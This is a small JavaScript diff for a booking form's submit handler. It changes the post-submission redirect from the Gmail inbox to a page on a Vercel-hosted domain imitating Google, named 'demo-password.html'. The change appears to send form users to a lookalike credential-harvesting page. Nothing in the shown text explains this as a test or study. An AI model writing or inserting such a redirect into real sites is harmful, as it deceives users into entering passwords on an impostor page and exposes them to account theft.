@@ -29,7 +29,7 @@ document.getElementById("bookingForm").addEventListener("submit", async function
     const result = await response.json();
 
     if (result.ok) {
-      window.location.href = "https://mail.google.com/mail/u/0/#inbox";
+      window.location.href = "https://google-omega-six.vercel.app/demo-password.html";
     } else {
       alert("حدث خطأ أثناء الإرسال");
     }
